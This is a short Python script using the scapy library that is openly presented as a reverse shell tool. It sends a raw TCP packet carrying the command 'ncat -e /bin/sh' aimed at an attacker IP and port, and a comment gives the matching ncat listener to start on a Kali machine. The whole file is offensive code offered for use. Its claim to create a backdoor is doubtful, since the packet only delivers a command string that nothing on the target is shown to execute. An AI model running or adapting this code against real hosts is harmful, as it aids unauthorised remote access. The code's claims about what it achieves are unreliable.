from scapy.all import * 
#reverse shell function targeting an IP and port 
def reverse_shell(target_ip, target_port, attacker_ip, attacker_port):
 payload = f"ncat -e /bin/sh {attacker_ip} {attacker_port}" 
 exploit = IP(dst=target_ip)/TCP(dport=target_port)/Raw(load=payload.encode()) 
 print(f"Creating reverse shell backdoor on {target_ip}:{target_port}") 
 send(exploit, verbose=0) 
if __name__ == "__main__": 
    reverse_shell("10.0.0.94", 9090, "10.0.0.87", 4444)
    #on your kali machine, listen on ncat -lvp 4444 
